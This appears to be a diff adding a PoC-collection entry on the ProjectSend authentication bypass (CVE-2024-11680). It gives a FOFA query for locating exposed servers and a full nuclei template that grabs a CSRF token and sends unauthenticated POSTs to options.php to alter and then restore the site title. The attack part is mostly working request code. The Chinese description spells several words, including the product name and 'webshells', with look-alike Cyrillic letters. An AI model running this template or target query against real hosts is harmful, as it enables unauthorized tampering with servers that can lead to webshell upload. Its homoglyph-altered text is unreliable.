@@ -1,0 +1,131 @@
+# ProjectSend身份认证绕过漏洞(CVE-2024-11680)
+
+PrојесtSеnd版本在r1720之前受到不当认证漏洞的影响,远程未经认证的攻击者可以通过发送精心制作的HTTP请求到орtiоnѕ.рhр来利用这个缺陷,从而未经授权地修改应用程序的配置,成功利用允许攻击者创建账户、上传ԝеbѕhеllѕ,并嵌入恶意JаvаSсript。
+
+## fofa
+
+```javascript
+body="ProjectSend"
+```
+
+## nuclei_poc
+
+```yaml
+id: projectsend-auth-bypass
+
+info:
+  name: ProjectSend <= r1605 - Improper Authorization
+  author: DhiyaneshDK
+  severity: high
+  description: |
+    An improper authorization check was identified within ProjectSend version r1605 that allows an attacker to perform sensitive actions such as enabling user registration and auto validation, or adding new entries in the whitelist of allowed extensions for uploaded files. Ultimately, this allows to execute arbitrary PHP code on the server hosting the application.
+  reference:
+    - https://www.projectsend.org/
+    - https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="ProjectSend"
+    shodan-query: html:"ProjectSend"
+  tags: misconfig,projectsend,auth-bypass,intrusive
+
+variables:
+  string: "{{randstr}}"
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "projectsend")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: csrf
+        group: 1
+        regex:
+          - 'name="csrf_token" value="([0-9a-z]+)"'
+        internal: true
+
+      - type: regex
+        name: title
+        group: 1
+        regex:
+          - '<title>Log in &raquo; ([0-9a-zA-Z]+)<\/title>'
+        internal: true
+
+  - raw:
+      - |
+        POST /options.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrf}}&section=general&this_install_title={{string}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{string}}")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /options.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrf}}&section=general&this_install_title={{title}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{title}}")'
+        condition: and
+
+# digest: 4b0a00483046022100daa2dba9e143fabb75766c67df507d5f0c405097db09624ce331213630ab1354022100ba972f4e1e7dca2d28077ef7f00c1198fd67ef41126ef47d00b5d8db77a78b4a:922c64590222798bb761d5b6d8e72950
+```
+
+
+
+## 漏洞来源
+
+- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/projectsend-auth-bypass.yaml
+- https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf
